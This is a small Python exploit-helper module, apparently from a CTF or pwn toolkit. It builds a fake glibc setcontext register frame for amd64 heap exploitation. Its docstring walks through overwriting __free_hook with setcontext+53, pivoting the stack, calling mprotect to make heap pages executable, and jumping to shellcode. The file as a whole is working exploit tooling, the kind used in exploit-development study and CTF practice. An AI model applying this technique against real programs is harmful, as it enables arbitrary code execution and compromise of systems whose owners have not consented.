#coding:utf-8

min_offset = 0x48
mapping = {
    'rip'   : 0xa8,
    'rsp'   : 0xa0,
    'rdi'   : 0x68,
    'rsi'   : 0x70,
    'rdx'   : 0x88,
    'rcx'   : 0x98,
    'r8'    : 0x28,
    'r9'    : 0x30,
    'rbx'   : 0x80,
    'rbp'   : 0x78,
    'r12'   : 0x48,
    'r13'   : 0x50,
    'r14'   : 0x58,
    'r15'   : 0x60,
}

def Frame(rip, rsp, rdi=0, rsi=0, rdx=0, rcx=0, r8=0, r9=0, 
            rbx = 0, rbp = 0, r12 = 0, r13 = 0, r14 = 0, r15 = 0):
    """#example:
    import pwn_framework as pf
    context.arch = 'amd64'
    # overwrite __free_hook to libc.symbols['setcontext'] + 53 first
    # rsp -> shellcode_addr -> shellcode
    frame = pf.setcontext.Frame(
        rip = libc.symbols['mprotect'],
        rsp = heap_base + 0x200,
        rdi = heap_base & (~0xfff),
        rsi = 0x2000,
        rdx = 4 | 2 | 1
    )
    payload = flat(frame, filler='\\0')  # len(payload) = 0xb0 = 176
    # payload = payload[0x48:]          # len(payload) = 0x68 = 104
    """
    res = {
        mapping['rip']  : rip,
        mapping['rsp']  : rsp,
        mapping['rdi']  : rdi,
        mapping['rsi']  : rsi,
        mapping['rdx']  : rdx,
        mapping['rcx']  : rcx,
        mapping['r8']   : r8,
        mapping['r9']   : r9,
        mapping['rbx']  : rbx,
        mapping['rbp']  : rbp,
        mapping['r12']  : r12,
        mapping['r13']  : r13,
        mapping['r14']  : r14,
        mapping['r15']  : r15,
    }
    return res